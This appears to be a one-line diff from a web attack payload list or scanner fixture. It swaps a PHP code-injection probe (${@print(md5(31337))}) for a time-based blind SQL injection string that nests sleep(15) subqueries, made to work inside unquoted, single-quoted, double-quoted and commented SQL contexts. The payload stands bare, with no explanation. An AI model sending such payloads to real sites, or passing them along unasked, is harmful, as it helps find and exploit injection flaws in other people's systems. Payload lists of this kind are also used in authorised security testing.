@@ -1,1 +1,1 @@
-${@print(md5(31337))}\
+(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'"+(select(0)from(select(sleep(15)))v)+"*/
